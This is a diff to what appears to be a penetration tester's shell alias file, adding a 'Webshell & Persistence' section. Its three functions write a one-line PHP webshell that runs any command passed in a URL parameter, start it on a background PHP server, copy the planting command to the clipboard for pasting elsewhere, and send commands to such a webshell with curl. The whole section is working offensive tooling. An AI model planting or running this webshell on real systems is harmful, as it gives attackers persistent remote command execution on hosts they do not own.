@@ -345,6 +345,36 @@ else
 fi
 }
 
+## Webshell & Persistence
+
+### PHP
+bang.webshell.php() {
+if [ "$1" = "-h" ] || [ -z "$1" ]; then
+    echo "Launch a php local server hosting a webshell. Webshell response only include stdout (not stderr): bang.webshell.php [port]"
+else
+    echo "<?php system(\$_GET['cmd']);?>" > webshell.php && (&>/dev/null php -S localhost:$1 webshell.php&)
+fi
+}
+
+bang.webshell.php.cpy() {
+if [ "$1" = "-h" ] || [ -z "$1" ]; then
+    echo "Echo and copy line that launch a local php server hosting a webshell: bang.webshell.php.cpy [port]"
+else
+    echo "echo \"<?php system(\$_GET['cmd']);?>\" > webshell.php && (&>/dev/null php -S localhost:$1 webshell.php&)"
+    echo "echo \"<?php system(\$_GET['cmd']);?>\" > webshell.php && (&>/dev/null php -S localhost:$1 webshell.php&)"| cpy
+fi
+}
+
+bang.webshell.php.dial() {
+if [ "$1" = "-h" ] || [ -z "${WSURL}" ] || [ -z "$1" ]; then
+    echo "Connect and interact with an webshell HTTP server to execute a command: bang.webshell.php.dial [cmd]. (Set WSLURL env var before using it)"
+else
+    echo "$WSURL"
+    echo "$@"
+    CMD="$@"
+    curl -X GET -G $WSURL --data-urlencode "cmd=${CMD}"
+fi
+}
 
 ##List all bang aliases
 bang.aliases() {
